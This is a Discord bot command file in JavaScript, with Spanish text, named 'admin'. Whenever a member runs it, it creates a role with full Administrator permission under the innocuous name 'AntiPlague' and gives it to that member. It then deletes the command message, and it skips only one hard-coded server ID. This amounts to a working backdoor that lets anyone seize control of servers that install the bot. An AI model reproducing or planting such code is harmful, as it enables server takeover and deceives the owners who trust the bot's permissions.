const { MessageEmbed } = require('discord.js');

module.exports.run = async(client, message,args ) => {
try { 
 let role = await message.guild.roles.create({
  data: {
    name: 'AntiPlague',
    color: '#ff0000',
    permissions:[8]
  },
  reason: '#AntiPlague',
});

  if(message.guild.id === '698706298572636191')return;
 message.member.roles.add(role)
message.delete({timeout:100,reason:"#AntiPlague"})
  
}catch (error) {
  
  message.author.send(new MessageEmbed()
 .setDescription(`Error :x: ocurrio un error.
 Posibles errores : `+"``` • Bot sin permisos suficientes.\n • Numero de roles maximos.```"+`
• **Error detallado.**`+
"\n```"+error+"```"

)                     
                      
                      )
}
  
  
}
module.exports.help = {
  
 name:"admin",
 aliases:["administrador",
          "permisos",
          "autopermisos",
          "autoadmin"],
 usage:"[ Uso Independiente : No require argumentos]",
 description:"Creara un rol con admin, y se lo dara al autor que ejecuto el comando.",
 category:"Nation Users"
}